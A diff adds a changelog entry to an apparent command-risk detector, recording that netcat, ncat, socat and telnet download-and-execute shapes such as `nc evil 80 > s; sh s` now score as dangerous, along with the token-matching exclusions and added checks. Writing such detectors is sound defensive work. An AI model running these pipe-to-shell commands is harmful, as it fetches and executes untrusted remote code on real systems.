@@ -4,6 +4,21 @@ All notable changes to HLSE Core (C reference) follow [Keep a Changelog](https:/
 
 ## [Unreleased]
 
+### Fixed (cycle-483)
+- **netcat-family fetch coverage in P2/P12b**: the classic
+  `nc host port | sh` and `nc evil 80 > s; sh s` download-execute
+  shapes scored 0 — netcat was missing from both `PASTE_DOWNLOADERS`
+  (P2 pipe) and `PASTE_FETCH_TOOLS` (P12b &&/; chain). Bare `nc` is a
+  substring hazard (inside `sync`, `zinc`, `func`), so it gates via
+  `ci_contains_tok` with `ncdu`/`ncftp`/`ncurses` exclusions — the
+  prefix match also covers `ncat`/any `nc*` tool name at token start.
+  `ncat`/`netcat`/`socat`/`telnet` join the plain fetch tables. Same
+  download-execute scores as curl/wget now: `nc e 80|sh`=40 (P2),
+  `nc > s; sh s`=45 (P12b), `socat ...; sh`=100 (P16+P12b),
+  `telnet > s; sh`=90. Benign `nc e 80`, `sync && sh`, `zinc a; sh x`,
+  and `ncdu`/`ncftp`/`ncurses` name-mentions stay clean of the new arms.
+  Suite 24,328 → 24,338 (+10 checks).
+
 ### Fixed (cycle-482)
 - **Token-boundary matching for bare tool-name needles**: the cycle-481
   exclusion sweep fixed eight cross-fire arms, but a probe found ~1,521
